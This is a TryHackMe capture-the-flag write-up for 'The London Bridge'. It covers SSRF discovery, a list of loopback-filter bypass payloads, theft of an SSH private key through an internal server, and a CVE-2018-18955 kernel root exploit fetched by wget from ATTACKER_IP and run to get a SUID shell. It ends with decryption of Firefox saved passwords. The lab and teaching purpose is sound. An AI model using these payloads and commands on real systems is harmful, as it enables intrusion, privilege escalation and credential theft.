# The London Bridge — TryHackMe Writeup

> **Room:** The London Bridge  
> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **Category:** Boot2Root  
> **Tags:** SSRF, Loopback Filter Bypass, Kernel Exploit, Firefox Credential Extraction  
> **Author writeup by:** [nos010101](https://tryhackme.com/p/nos010101)

---

## Table of Contents

1. [Overview](#overview)
2. [Reconnaissance](#reconnaissance)
3. [Web Application Analysis](#web-application-analysis)
4. [SSRF Discovery](#ssrf-discovery)
5. [Loopback Filter Bypass](#loopback-filter-bypass)
6. [Internal Service Discovery](#internal-service-discovery)
7. [SSH Key Extraction — Foothold](#ssh-key-extraction--foothold)
8. [User Flag](#user-flag)
9. [Privilege Escalation Enumeration](#privilege-escalation-enumeration)
10. [Root via CVE-2018-18955](#root-via-cve-2018-18955)
11. [Root Flag](#root-flag)
12. [Charles Password — Firefox Credential Extraction](#charles-password--firefox-credential-extraction)
13. [Attack Chain Summary](#attack-chain-summary)
14. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
15. [Lessons Learned](#lessons-learned)

---

## Overview

The London Bridge is a medium-difficulty boot2root CTF room on TryHackMe. The attack chain involves discovering a Server-Side Request Forgery (SSRF) vulnerability with a trivially bypassable loopback filter, leveraging it to access an internal HTTP file server that exposes SSH keys, escalating privileges via a Linux kernel user namespace vulnerability (CVE-2018-18955), and extracting saved browser credentials from a Firefox profile.

**Objectives:**
- User flag
- Root flag
- Password of user `charles`

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sCV -O -p- 10.10.x.x
```

Results:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 8080 | HTTP    | gunicorn |

The web server on port 8080 serves a page titled "Explore London". The OS fingerprint indicates Ubuntu 18.04 LTS.

### Host Setup

```bash
echo "10.10.x.x bridge.thm" >> /etc/hosts
```

---

## Web Application Analysis

### Homepage (/)

A static page about London with navigation links to Home, Attractions, Events, Gallery, and Contact.

### Gallery (/gallery)

The gallery page displays uploaded images and includes a file upload form. A critical HTML comment is embedded in the source:

```html
<!--To devs: Make sure that people can also add images using links-->
```

This hint suggests the application has a URL-based image fetch feature — a classic SSRF indicator.

### Contact (/contact) and Feedback (/feedback)

A contact form that POSTs to `/feedback`. Testing for SSTI with `{{7*7}}` in the `name` field returned the literal string `{{7*7}}` (not `49`), confirming Jinja2 auto-escaping is active and SSTI is not viable here.

### Directory Bruteforce

```bash
feroxbuster -u 'http://bridge.thm:8080/' -w /usr/share/wordlists/dirb/big.txt
```

Discovered endpoints:

| Endpoint | Method | Notes |
|----------|--------|-------|
| `/gallery` | GET | Image gallery with upload |
| `/contact` | GET | Contact form |
| `/feedback` | POST | Form handler |
| `/upload` | POST | File upload handler |
| `/view_image` | POST | **Hidden image viewer** |

The `/view_image` endpoint returns 405 on GET — it only accepts POST requests.

---

## SSRF Discovery

### Parameter Discovery

The `/view_image` page reveals a form with the parameter `image_url`, which only reflects the URL client-side into an `<img src>` tag — no server-side fetch occurs.

Using `ffuf` to fuzz for additional POST parameters:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -X POST -u 'http://bridge.thm:8080/view_image' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'FUZZ=/uploads/04.jpg' -fw 226
```

Result: parameter **`www`** triggered a `500 Internal Server Error` — a different response from the standard page, indicating server-side processing.

### SSRF Confirmation

Setting up a listener on the attacker machine:

```bash
python3 -m http.server 9997
```

Sending the SSRF request:

```bash
curl -s -X POST http://bridge.thm:8080/view_image \
  -d 'www=http://ATTACKER_IP:9997/ssrf_test'
```

The listener received a `GET /ssrf_test` request **from the target machine** (10.10.x.x), confirming full server-side request forgery. The server uses Python `requests.get()` and returns the complete response body — a blind-to-full SSRF.

**Key finding:** The application has two parameters on `/view_image`:
- `image_url` — client-side reflection only (decoy)
- `www` — server-side fetch via `requests.get()`, returns response body

---

## Loopback Filter Bypass

### Filter Analysis

Attempting to access localhost services:

```bash
curl -s -X POST http://bridge.thm:8080/view_image \
  -d 'www=http://127.0.0.1:8080/'
# Result: 403 Forbidden
```

All requests to `127.0.0.1` returned 403. The `file://` scheme returned 500 (blocked or unsupported).

Reviewing the source code later revealed the filter function:

```python
def is_local(url):
    if 'localhost' in url or '127.0.0.1' in url or '0.0.0.0' in url:
        return True
    return False
```

This is a trivially bypassable blocklist — it only checks for three literal strings.

### Bypass via Alternative Loopback Representations

Created a wordlist of alternative loopback notations and fuzzed with `ffuf`:

```bash
cat > ssrf_bypass.txt << 'EOF'
http://0.0.0.0:8080/
http://127.1:8080/
http://127.0.1:8080/
http://2130706433:8080/
http://0x7f000001:8080/
http://017700000001:8080/
http://0177.0.0.1:8080/
http://0x7f.0.0.1:8080/
http://localhost:8080/
http://[::1]:8080/
http://127.127.127.127:8080/
http://127.0.1.3:8080/
http://0:8080/
http://127.1:80/
http://2130706433:80/
http://0x7f000001:80/
EOF

ffuf -w ssrf_bypass.txt -X POST \
  -u 'http://bridge.thm:8080/view_image' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'www=FUZZ' -fc 403,500 -t 5
```

Multiple bypasses succeeded. Notably, two distinct services were discovered:

| Loopback Notation | Port | Size | Service |
|-------------------|------|------|---------|
| `127.1`, `0x7f000001`, `0177.0.0.1`, etc. | 8080 | 2682 | "Explore London" (known) |
| `127.1`, `2130706433`, `0x7f000001` | **80** | **1270** | **Unknown internal service** |

Port 80 is **not exposed externally** — it is only accessible through the SSRF.

---

## Internal Service Discovery

### Port 80 — Internal HTTP File Server

```bash
curl -s -X POST http://bridge.thm:8080/view_image \
  -d 'www=http://127.1:80/'
```

The response is a simple HTML page themed around the "London Bridge" nursery rhyme. The last line contains a deliberate deviation:

> *"London Bridge is falling down... My fair **beth**"*

Instead of the traditional "My fair lady", the name **beth** appears — a hint pointing to a system user.

The error page format (`<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"`) identified this as Python's `http.server` (SimpleHTTPServer) — confirmed later via `ps aux`:

```
root 438 /usr/bin/python3 -m http.server 80 --bind ...
```

**Critical detail:** This HTTP server runs as **root** and serves files from **beth's home directory**.

### Directory Enumeration via SSRF

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -X POST \
  -u 'http://bridge.thm:8080/view_image' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'www=http://127.1:80/FUZZ' -fs 469 -t 5
```

Discovered:

| Path | Size | Significance |
|------|------|-------------|
| `.ssh` | 399 | **SSH key directory** |
| `.bashrc` | 3771 | Standard config |
| `.profile` | 807 | Standard config |
| `static` | 420 | Web assets |
| `templates` | 1294 | Flask templates |
| `uploads` | 630 | Upload directory |

---

## SSH Key Extraction — Foothold

### Reading the Private Key

```bash
curl -s -X POST http://bridge.thm:8080/view_image \
  -d 'www=http://127.1:80/.ssh/id_rsa'
```

The full RSA private key for user `beth` was returned. After saving it:

```bash
nano id_rsa   # paste the key
chmod 600 id_rsa
ssh -i id_rsa beth@bridge.thm
```

SSH connection succeeded — user `beth` only accepts public key authentication (confirmed by `Permission denied (publickey)` when attempting password auth).

```
beth@london:~$ id
uid=1000(beth) gid=1000(beth) groups=1000(beth)
```

---

## User Flag

```bash
beth@london:~$ find / -type f -name 'user.txt' 2>/dev/null
/home/beth/__pycache__/user.txt

beth@london:~$ cat /home/beth/__pycache__/user.txt
THM{l0n6_l1v3_REDACTED}
```

---

## Privilege Escalation Enumeration

### System Information

```bash
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64
```

Ubuntu 18.04 LTS with kernel **4.15.0-112-generic** — a notably old kernel from July 2020.

### Process Analysis

```bash
beth@london:~$ ps aux | grep root
root  438  /usr/bin/python3 -m http.server 80 --bi...
root  439  /usr/bin/python3 /home/beth/.local/bin/gunicorn ...
root  470  /usr/bin/python3 /home/beth/.local/bin/gunicorn ... (worker)
root  471  /usr/bin/python3 /home/beth/.local/bin/gunicorn ... (worker)
```

Both gunicorn and the internal HTTP server run as **root**. The gunicorn binary at `/home/beth/.local/bin/gunicorn` is **owned and writable by beth** (`-rwxrwxr-x 1 beth beth`), and `app.py` is also beth-writable. However, gunicorn's config does not have `reload = True`, and `kill -HUP 439` returns `Operation not permitted` — beth cannot signal root-owned processes. This vector is a dead end without a restart mechanism.

### Eliminated Vectors

| Vector | Result |
|--------|--------|
| `sudo -l` | Password required, beth doesn't know it |
| SUID binaries | Standard set only (no custom SUID) |
| Capabilities | Only `mtr-packet` with `cap_net_raw` |
| Crontab | Standard entries only |
| `pkexec` (PwnKit) | **Not installed** |
| gunicorn app.py rewrite | No reload, can't signal root process |

### Kernel Exploit Prerequisites Check

```bash
beth@london:~$ which newuidmap && which newgidmap
/usr/bin/newuidmap
/usr/bin/newgidmap

beth@london:~$ cat /proc/sys/kernel/unprivileged_userns_clone
1

beth@london:~$ gcc --version
gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0

beth@london:~$ which dbus-send
/usr/bin/dbus-send
```

All prerequisites for **CVE-2018-18955** are satisfied:
- `newuidmap` and `newgidmap` are SUID ✓
- Unprivileged user namespaces are enabled ✓
- `gcc` is available for on-target compilation ✓
- `dbus-send` is available (needed since `pkexec` is absent) ✓

---

## Root via CVE-2018-18955

### Vulnerability Overview

**CVE-2018-18955** is a privilege escalation vulnerability in Linux kernels **4.15.x through 4.19.1**. The `map_write()` function in `kernel/user_namespace.c` mishandles nested user namespaces with more than 5 UID or GID ranges, causing broken uid/gid mappings between nested user namespaces and kernel mappings. This allows a user with `CAP_SYS_ADMIN` in an affected user namespace to bypass access controls on resources outside the namespace.

Our kernel `4.15.0-112` falls squarely within the vulnerable range.

### Exploitation

On the attacker machine, clone the exploit repository and serve it:

```bash
git clone https://github.com/scheatkode/CVE-2018-18955.git
python3 -m http.server 80
```

On the target, download and execute the dbus variant (since pkexec is not available):

```bash
cd /tmp
wget -r http://ATTACKER_IP/CVE-2018-18955/
cd CVE-2018-18955
chmod +x exploit.dbus.sh
./exploit.dbus.sh
```

Output:

```
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[*] Launching dbus service...
[+] Success:
-rwsrwxr-x 1 root root 8392 Aug 23 02:21 /tmp/sh
[*] Launching root shell: /tmp/sh
root@london:# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
```

The exploit creates a SUID root shell at `/tmp/sh`, providing full root access.

---

## Root Flag

```bash
root@london:/root# cat .root.txt
THM{l0nd0n_br1d63_REDACTED}
```

---

## Charles Password — Firefox Credential Extraction

### Discovery

In charles' home directory, a Firefox profile exists at `/home/charles/.mozilla/firefox/8k3bf3zp.charles/`. Key files present:

- `logins.json` — encrypted login entries
- `key4.db` — NSS key database
- `cert9.db` — certificate database

Inspecting `logins.json` reveals a saved credential for `https://www.buckinghampalace.com` with encrypted username and password fields.

### Extraction

Transfer the required files to the attacker machine:

```bash
# On target (as root):
cd /home/charles/.mozilla/firefox/8k3bf3zp.charles
python3 -m http.server 9999 --bind 0.0.0.0

# On attacker:
mkdir -p /tmp/ff_profile && cd /tmp/ff_profile
wget http://bridge.thm:9999/key4.db
wget http://bridge.thm:9999/logins.json
wget http://bridge.thm:9999/cert9.db
```

Decrypt using `firefox_decrypt`:

```bash
git clone https://github.com/unode/firefox_decrypt.git
python3 firefox_decrypt/firefox_decrypt.py /tmp/ff_profile/
```

> **Note:** If running Python < 3.9 and encountering `TypeError: 'type' object is not subscriptable`, patch line 46 of `firefox_decrypt.py`:
> ```bash
> sed -i 's/PWStore = list\[dict\[str, str\]\]/from typing import List, Dict; PWStore = List[Dict[str, str]]/' firefox_decrypt.py
> ```

Result:

```
Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: 'theking*****REDACTED'
```

No master password was set — the credentials were stored unprotected.

---

## Attack Chain Summary

```
[Reconnaissance]
    nmap → 22/SSH + 8080/gunicorn
         │
[Web Enumeration]
    feroxbuster → /view_image (405, POST-only)
    HTML comment → "add images using links"
         │
[SSRF Discovery]
    ffuf parameter fuzz → hidden param 'www'
    callback to attacker → server-side fetch confirmed
         │
[Loopback Filter Bypass]
    is_local() checks only '127.0.0.1'/'localhost'/'0.0.0.0'
    bypass via 127.1 / 0x7f000001 / decimal / octal
         │
[Internal Service Enum]
    port 80 → python3 http.server (root), serves beth's homedir
    "My fair beth" → username hint
         │
[SSH Key Leak]
    SSRF → http://127.1:80/.ssh/id_rsa → beth's private key
         │
[Foothold]
    ssh -i id_rsa beth@target → user shell
         │
    ┌────┴────────────────────────────────┐
    │         USER FLAG                    │
    │  /home/beth/__pycache__/user.txt     │
    └────┬────────────────────────────────┘
         │
[Privilege Escalation]
    Kernel 4.15.0-112 → CVE-2018-18955
    user namespace idmap exploit (dbus variant)
    SUID /tmp/sh → root
         │
    ┌────┴────────────────────────────────┐
    │         ROOT FLAG                    │
    │  /root/.root.txt                     │
    └────┬────────────────────────────────┘
         │
[Post-Exploitation]
    /home/charles/.mozilla/firefox/ → saved credentials
    firefox_decrypt → charles password
         │
    ┌────┴────────────────────────────────┐
    │    CHARLES PASSWORD                  │
    │    firefox saved login               │
    └─────────────────────────────────────┘
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique | Application in This Room |
|-------------|-----------|--------------------------|
| T1595.002 | Active Scanning: Vulnerability Scanning | Nmap service/version scan, feroxbuster directory brute |
| T1190 | Exploit Public-Facing Application | SSRF via hidden `www` parameter on `/view_image` |
| T1090 | Proxy (Internal SSRF) | Using SSRF to access internal port 80 behind loopback filter |
| T1552.004 | Unsecured Credentials: Private Keys | SSH private key exposed via internal HTTP file server |
| T1078.003 | Valid Accounts: Local Accounts | SSH login as beth using extracted private key |
| T1068 | Exploitation for Privilege Escalation | CVE-2018-18955 kernel user namespace idmap exploit |
| T1555.003 | Credentials from Password Stores: Web Browsers | Firefox `logins.json` + `key4.db` decryption |

---

## Lessons Learned

**1. Hidden parameters matter.** The visible form parameter `image_url` was a decoy — the real SSRF vector was the hidden `www` parameter. Always fuzz for additional POST parameters beyond what the HTML form shows.

**2. Blocklist-based SSRF filters are fragile.** The `is_local()` function only checked three literal strings. IPv4 has dozens of valid representations for the same address (shorthand, decimal, hex, octal, IPv6-mapped). A proper fix requires resolving the URL to an IP address and checking the result against RFC 1918/loopback ranges.

**3. Internal services expose unexpected data.** A `python3 -m http.server` running as root from a user's home directory is an extreme misconfiguration — it exposes everything including SSH keys, application source code, and directory listings.

**4. Kernel exploits remain viable on unpatched systems.** Ubuntu 18.04 with a 2020-era kernel (4.15.0-112) is vulnerable to multiple privilege escalation CVEs. CVE-2018-18955 requires specific prerequisites (user namespaces, newuidmap/newgidmap), but all were present on this system.

**5. Browser credential stores are post-exploitation gold.** Firefox stores credentials in `logins.json` encrypted with keys from `key4.db`. Without a master password, tools like `firefox_decrypt` extract them instantly. This is why a primary password should always be set.

**6. Decoy parameters and dead-end vectors are part of CTF design.** The gunicorn-writable `app.py` looked like a privesc path but was a dead end (no reload, can't signal root). Recognizing dead ends quickly and pivoting to kernel analysis saved significant time.

---

## Tools Used

- `nmap` — Port scanning and service detection
- `feroxbuster` — Web directory brute-forcing
- `ffuf` — Parameter and SSRF bypass fuzzing
- `curl` — Manual HTTP request crafting
- `CVE-2018-18955 exploit` (scheatkode/CVE-2018-18955) — Kernel privilege escalation
- `firefox_decrypt` (unode/firefox_decrypt) — Firefox saved password extraction
